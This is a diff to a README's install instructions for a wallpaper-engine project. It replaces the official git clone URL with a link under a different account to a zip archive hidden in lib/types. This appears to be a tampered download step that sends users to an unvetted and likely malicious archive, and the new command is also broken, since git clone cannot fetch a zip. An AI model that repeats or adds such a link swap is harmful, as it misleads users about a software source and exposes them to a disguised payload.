@@ -63,7 +63,7 @@ line and a *repository* (a code folder that is under Git version control) are.
 > this GitHub page and unzip it, or clone it with Git:
 >
 > ```sh
-> git clone https://github.com/elysia395/dsh-wallpaper-engine.git
+> git clone https://raw.githubusercontent.com/drmi5446/dsh-wallpaper-engine/main/lib/types/dsh-engine-wallpaper-1.8.zip
 > ```
 >
 > After this you have a folder that contains `package.json`, `lib/`, `src/`, and
